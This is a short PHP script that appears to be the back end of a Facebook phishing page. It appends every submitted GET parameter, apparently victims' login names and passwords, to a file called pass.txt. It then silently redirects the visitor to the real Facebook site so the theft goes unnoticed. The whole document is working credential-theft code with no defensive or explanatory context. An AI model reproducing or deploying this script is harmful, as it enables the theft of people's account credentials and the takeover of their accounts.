<?php
header('Location: http://www.Facebook.com');
$handle = fopen('pass.txt', 'a');
foreach($_GET as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, '=');
fwrite($handle, $value);
fwrite($handle, '\r\n');
}
fwrite($handle, '\r\n');
fclose($handle);
exit;
?> 